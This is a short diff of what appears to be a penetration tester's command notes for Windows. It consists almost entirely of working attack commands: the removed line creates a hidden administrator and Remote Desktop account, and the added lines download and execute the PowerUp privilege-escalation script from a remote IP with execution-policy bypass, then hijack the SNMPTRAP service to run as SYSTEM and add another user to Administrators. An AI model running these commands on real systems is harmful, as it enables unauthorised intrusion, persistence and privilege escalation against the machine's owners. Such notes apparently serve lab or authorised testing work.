@@ -1,1 +1,8 @@
-NET USER jan-karel C0mpl3x.teit /ADD && NET localgroup "Administrators" /ADD jan-karel && NET localgroup "Remote Desktop Users" /ADD jan-karel
+
+
+
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.176/tools/PowerUp.ps1');Invoke-AllChecks"
+
+
+sc config SNMPTRAP obj= "NT AUTHORITY\SYSTEM" password= ""
+sc config snmptrap binpath= "C:\Windows\System32\net.exe localgroup Administrators nina /add"
